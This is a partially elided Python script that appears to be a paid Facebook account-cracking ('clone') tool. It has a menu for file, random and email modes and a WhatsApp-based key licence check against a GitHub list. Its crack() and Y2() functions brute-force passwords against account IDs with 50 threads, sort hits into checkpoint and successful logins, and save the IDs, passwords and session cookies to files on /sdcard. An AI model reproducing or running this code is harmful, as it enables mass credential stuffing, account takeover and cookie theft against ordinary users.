...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[FCH-XD')
...
\033[1;91m★★★★★★★★★★★★★
\033[1;91m[>] CREATOR   > SADMAN FCH SNIGDHO
\033[1;91m[<] FACEBOOK  > SNIGDHO AFRIDI
\033[1;91m[>] GITHUB    > FCH-CYBER
\033[1;91m[<] VERSION   > PAID
\033[1;91m[>] WHATSAPP  > +88013173414**
\033[1;91m★★★★★★★★★★★★★★"""  )
...
def menu():
	os.system('clear')
	banner()
	_FCH_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	_FCH_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	_FCH_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	_FCH_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
	_FCH_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____FCH_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____FCH_____ in ['1']:
		C1()
	if _____FCH_____ in ['2']:
		Y2()
	if _____FCH_____ in ['3']:
		BER()
	if _____FCH_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100000448332183")
	if _____FCH_____ in ['0']:
		exit()
...
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(FCH_NAME))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [FCH] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mFCH-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				print(f'\r\x1b[1;92m [\033[1;92mFCH-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				cek_apk(session,coki)
				open('/sdcard/FCH-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as FCH:
        clear()
        tl = str(len(user))      
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mFCH-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
        	    cek_apk(session,coki)
        	    open('/sdcard/FCH-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	else:
        	    continue
        loop+=1
        sys.stdout.write('\r%s[FCH-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801886653082?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20FCH%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://raw.githubusercontent.com/MrFCH156/approved.txt/main/approved.%20txt').text
    if key1 in r:
